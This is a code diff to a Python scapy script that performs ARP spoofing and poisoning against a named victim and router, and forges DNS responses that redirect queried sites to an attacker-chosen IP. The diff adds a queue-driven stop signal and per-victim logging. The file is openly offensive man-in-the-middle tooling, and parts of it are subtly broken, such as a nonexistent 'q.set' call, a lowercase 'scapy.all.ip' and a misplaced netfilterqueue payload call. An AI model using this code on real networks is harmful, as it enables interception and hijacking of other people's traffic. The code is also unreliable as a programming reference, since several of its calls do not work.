@@ -1,13 +1,22 @@
 #! /usr/bin/env python
 import logging
+import Queue
+
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 from scapy.all import *
-import socket
-import math
 
 
 logger = logging.getLogger()
+q = Queue.Queue()
+
+
+def set_queue(set_q):
+    q.put(set_q)
+
+
+def get_queue():
+    q.get(False)
 
 
 # Converts the byte formats that scapy returns to something we can read
@@ -80,7 +89,7 @@ def arp_spoof(victim_ip, victim_mac, router_ip, router_mac, attacker_mac=None):
         attacker_mac = scapy.all.get_if_hwaddr(interface)
 
     # sends packets to the victim and server, performing ARP spoofing
-    logger.info("Spoofing target")
+    logger.info("Spoofing " + str(victim_ip))
     sys.stdout = open(os.devnull, 'w')
     scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac, hwsrc=attacker_mac))
     scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac, hwsrc=attacker_mac))
@@ -89,7 +98,7 @@ def arp_spoof(victim_ip, victim_mac, router_ip, router_mac, attacker_mac=None):
 
 # Restores the ARP spoofing packets by resetting back to original state
 def arp_restore(victim_ip, victim_mac, router_ip, router_mac):
-    logger.info("Starting ARP restoration")
+    logger.info("Starting ARP restoration for " + str(victim_ip))
     sys.stdout = open(os.devnull, 'w')
     scapy.all.send(scapy.all.ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=4)
     scapy.all.send(scapy.all.ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=router_mac), count=4)
@@ -105,40 +114,52 @@ def arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac=None):
         attacker_mac = scapy.all.get_if_hwaddr(interface)
 
     # Sends packet to the server
-    logger.info("Spoofing target")
+    logger.info("Spoofing target " + str(victim_ip))
     sys.stdout = open(os.devnull, 'w')
     scapy.all.send(scapy.all.ARP(op=1, hwsrc=attacker_mac, psrc=router_ip, hwdst=victim_mac, pdst=victim_ip))
     sys.stdout = sys.__stdout__
 
 
 def arp_poison(victim_ip, victim_mac, router_ip, router_mac, attacker_mac, iterations=100):
-    logger.info("Start spoofing network...")
-    try:
-        for i in range(iterations):
-            logger.info("Starting iteration " + str(i))
+    logger.info("Start spoofing network on " + str(victim_ip))
+
+    for i in range(iterations):
+        try:
+            msg = q.get(False)
+            if msg == 'stop':
+                logger.info("Interrupted, restoring ARP table for " + str(victim_ip))
+                arp_restore(victim_ip, victim_mac, router_ip, router_mac)
+                break
+            else:
+                q.set(msg)
+        except Queue.Empty:
+            logger.info("Starting iteration " + str(i) + " for " + str(victim_ip))
             arp_spoof(victim_ip, victim_mac, router_ip, router_mac, attacker_mac)
             time.sleep(2)
-    except KeyboardInterrupt:
-        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
+
+    logger.info("Done spoofing")
+    sys.exit(1)
 
 
 def arp_poison_stealthy(victim_ip, victim_mac, router_ip, attacker_mac):
-    logger.info("Start spoofing network silently...")
+    logger.info("Start spoofing network silently on " + str(victim_ip))
     arp_spoof_stealth(victim_ip, victim_mac, router_ip, attacker_mac)
+    logger.info("Done spoofing")
+    sys.exit(1)
 
 
 def dns_spoofing(interface, website, ip, spoof_all):
     # queue = netfilterqueue.NetfilterQueue()
     # netfilterqueue.QueueHandler.bind(queue_num, callback[, max_len[, range,[sock_len]]])
 
-    dns_packet = scapy.all.sniff(iface=interface, filter ="dst port 53", count = 1)
+    dns_packet = scapy.all.sniff(iface=interface, filter="dst port 53", count=1)
 
-    if(not spoof_all):
-        if (ip != dns_packet[scapy.all.ip].src):
+    if not spoof_all:
+        if ip != dns_packet[scapy.all.ip].src:
             pass
 
     if scapy.all.DNS in dns_packet:
-        dns_source_ip = dns_packet[0].getlayer(IP).src
+        dns_source_ip = dns_packet[0].getlayer(scapy.all.IP).src
         if dns_packet[0].haslayer(scapy.all.TCP):
             dns_source_port = dns_packet[0].getlayer(scapy.all.TCP).sport
         elif dns_packet[0].haslayer(scapy.all.UDP):
@@ -152,17 +173,17 @@ def dns_spoofing(interface, website, ip, spoof_all):
         dns_query = dns_packet[0].getlayer(scapy.all.DNS).qd.qname
 
         if dns_packet[0].haslayer(scapy.all.TCP):
-            spoofed_packet = scapy.all.IP(dst= dns_packet[scapy.all.ip].src)/ \
+            spoofed_packet = scapy.all.IP(dst=dns_packet[scapy.all.ip].src) / \
                              scapy.all.TCP(dport=dns_source_port, sport=dns_packet[scapy.all.TCP].dport) / \
-                             scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[scapy.all.DNS].qd, \
+                             scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[scapy.all.DNS].qd,
                                            an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=ip))
             scapy.all.packet.set_payload(scapy.all.str(spoofed_packet))
             scapy.all.packet.accept()
         else:
-            spoofed_packet = scapy.all.IP(dst= dns_packet[scapy.all.ip].src) / \
-                             scapy.all.UDP(dport= dns_source_port, sport = dns_packet[scapy.all.UDP].dport)/\
-                             scapy.all.DNS(id=dns_query_id, qr= 1, aa= 1, qd=dns_packet[scapy.all.DNS].qd,\
-                            an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=ip))
+            spoofed_packet = scapy.all.IP(dst=dns_packet[scapy.all.ip].src) / \
+                             scapy.all.UDP(dport=dns_source_port, sport=dns_packet[scapy.all.UDP].dport) / \
+                             scapy.all.DNS(id=dns_query_id, qr=1, aa=1, qd=dns_packet[scapy.all.DNS].qd,
+                                           an=scapy.all.DNSRR(rrname=dns_query, ttl=10, rdata=ip))
             scapy.all.packet.set_payload(scapy.all.str(spoofed_packet))
             scapy.all.packet.accept()
 
